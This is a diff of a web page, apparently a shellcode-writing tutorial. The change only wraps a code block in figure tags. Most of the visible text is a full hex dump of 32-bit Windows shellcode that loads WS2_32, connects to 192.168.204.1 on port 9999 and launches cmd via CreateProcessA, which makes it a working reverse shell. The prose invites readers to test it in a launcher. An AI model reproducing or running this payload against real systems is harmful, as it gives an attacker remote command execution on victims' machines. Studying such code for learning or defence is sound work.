@@ -201,7 +201,7 @@ CreateProcessA_call:
 	call eax
 	int3</code></pre>
 <p>There you have it! This assembles to the following shellcode payload: </p>
-<pre><code contenteditable spellcheck="false">E8 13 00 00 00 57 53 32 5F 33 32 00 02 00 27 0F
+<figure><pre><code contenteditable spellcheck="false">E8 13 00 00 00 57 53 32 5F 33 32 00 02 00 27 0F
 C0 A8 CC 01 63 6D 64 00 5D E8 E9 00 00 00 89 C3
 68 72 FE B3 16 53 E8 91 00 00 00 50 68 8E 4E 0E
 EC 53 E8 85 00 00 00 55 FF D0 89 C3 68 EC F9 AA
@@ -222,7 +222,7 @@ EC 53 E8 85 00 00 00 55 FF D0 89 C3 68 EC F9 AA
 6F 29 C0 F3 74 04 8B 36 EB EA 8B 46 08 5E C3 56
 57 53 8B 74 E4 10 8B 5C E4 14 31 FF FC 31 C0 AC
 01 DE 38 E0 74 07 C1 CF 0D 01 C7 EB F0 89 F8 5B
-5F 5E C2 08 00</code></pre>
+5F 5E C2 08 00</code></pre></figure>
 <p>We can verify that the payload works correctly by running it in the launcher that we wrote in the last post. Remember to compile as a 32-bit program!</p>
 			</div>
 		</div>
